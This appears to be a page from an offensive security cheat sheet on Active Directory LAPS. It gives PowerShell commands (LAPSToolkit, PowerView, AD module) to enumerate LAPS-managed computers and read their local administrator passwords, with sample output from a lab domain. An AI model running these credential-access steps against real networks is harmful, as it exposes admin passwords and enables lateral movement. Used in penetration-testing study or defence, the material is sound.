---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/ad-attack/laps
---

# LAPs

### LAPS Enumeration

```powershell
# LAPSToolkit
PS C:\Tools> Import-Module .\LAPSToolkit.ps1
PS C:\Tools> Get-LAPSComputers

ComputerName                   Password Expiration
------------                   -------- ----------
appsrv.vulnableonelocal        02/28/2024 01:30:36

# PowerView
PS C:\Tools> Get-DomainObject -SearchBase "LDAP://DC=vulnableone,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname

PS C:\Tools> Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
```

### Get Password

With privilege user who can read Laps password

```powershell
C:\>runas /user:khan.chanthou@vulnableone.local /netonly powershell
Enter the password for khan.chanthou@vulnableone.local:
Attempting to start powershell as user "khan.chanthou@vulnableone.local" ...

# LAPSToolkit
PS C:\> import-module C:\Tools\LAPSToolkit.ps1
PS C:\> Get-LAPSComputers

ComputerName               Password           Expiration
------------               --------           ----------
appsrv.vulnableonelocal    d3ke3DnF*2lbz.     02/28/2024 01:30:36

# PowerView
PS C:\> Get-DomainComputer | select DnsHostName, ms-Mcs-AdmPwd

dnshostname                 ms-Mcs-AdmPwd 
-----------                 -------------               
appsrv.vulnableone.local    d3ke3DnF*2lbz.

# AD-Module
PS C:\> Get-ADComputer -Identity appsrv -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
d3ke3DnF*2lbz.
```
